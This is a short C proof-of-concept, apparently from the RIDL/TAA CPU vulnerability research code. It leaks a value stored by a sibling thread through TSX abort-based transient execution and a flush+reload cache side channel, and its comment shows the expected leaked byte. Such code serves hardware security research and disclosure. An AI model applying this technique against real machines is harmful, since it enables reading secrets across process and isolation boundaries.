/*
Leak a cross-thread store using TSX cache-conflict aborts.

Notes:

Expected output:
$ taskset -c 3,7 ./taa_basic
0003983: 89 (?)

*/
#define ITERS 10000

#include "ridl.h"

int main(int argc, char *argv[]) {
	pid_t pid = fork();
	if (pid == 0) {
		while (1)
			asm volatile(
				"movq %0, (%%rsp)\n"
				::"r"(0x89ull));
	}
	if (pid < 0) return 1;

	ALLOC_BUFFERS();

	memset(results, 0, sizeof(results));

	for (size_t i = 0; i < ITERS; ++i) {
		flush(reloadbuffer);
		tsxabort_leak_clflush(leak, reloadbuffer, reloadbuffer);
		reload(reloadbuffer, results);
	}

	print_results(results);
	kill(pid, SIGKILL);
}

